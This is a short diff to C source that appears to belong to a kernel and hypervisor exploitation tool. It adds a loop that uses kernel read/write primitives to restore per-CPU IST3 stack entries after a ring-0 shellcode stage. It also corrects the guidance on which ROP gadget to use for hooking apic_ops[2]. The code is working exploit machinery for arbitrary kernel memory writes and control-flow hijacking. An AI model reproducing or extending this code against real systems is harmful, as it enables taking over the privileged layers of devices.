@@ -5124,6 +5124,24 @@ static int phase9_ring0_arm_trigger(
                    (unsigned long)ops2_now, (unsigned long)original_xapic);
         }
 
+        /* Restore IST3 on ALL CPUs (handler only restored CPU 0).
+         * The ring-0 shellcode set IST3 on all 16 CPUs to
+         * cave_kva+0x100.  Stale IST3 values are mostly harmless
+         * (IDT[13] restored to IST=0), but clean up properly to
+         * avoid any edge cases during suspend. */
+        printf("[*] Restoring IST3 on all %d CPUs...\n", NUM_CPUS_P9);
+        for (int cpu = 0; cpu < NUM_CPUS_P9; cpu++) {
+            uint64_t cpu_ist3_dmap = g_dmap_base + tss_pa +
+                                     cpu * TSS_STRIDE_P9 + 0x34;
+            /* Read original IST3 from the pre-arm state.
+             * Handler already restored CPU 0; for CPUs 1-15,
+             * write the same original value. */
+            uint64_t orig_ist3_val;
+            kernel_copyout(g_dmap_base + tss_pa + 0x34, &orig_ist3_val, 8);
+            kernel_copyin(&orig_ist3_val, cpu_ist3_dmap, 8);
+        }
+        printf("[+] IST3 restored on all %d CPUs\n", NUM_CPUS_P9);
+
         notify("[HV Research] Phase 9: arm+trigger SUCCESS! Enter rest mode when ready.");
         return 1;
     } else {
@@ -6142,8 +6160,10 @@ static void campaign_flatz_setup(void) {
         printf("[+]    justreturn:          0x%016lx\n",
                (unsigned long)ks_justret);
         printf("[+]\n");
-        printf("[+]  nop_ret can be used as apic_ops[2] hook target!\n");
-        printf("[+]  It's a bare 'ret' in ktext — safe, no side effects.\n");
+        printf("[+]  nop_ret is a bare 'ret' in ktext (ROP gadget).\n");
+        printf("[!]  WARNING: NOT safe for apic_ops[2] — bare ret returns\n");
+        printf("[!]  garbage in eax.  xapic_mode MUST return 1 (xAPIC).\n");
+        printf("[!]  Use 'mov eax, 1; ret' gadget instead.\n");
 
         printf("\n");
         fflush(stdout);
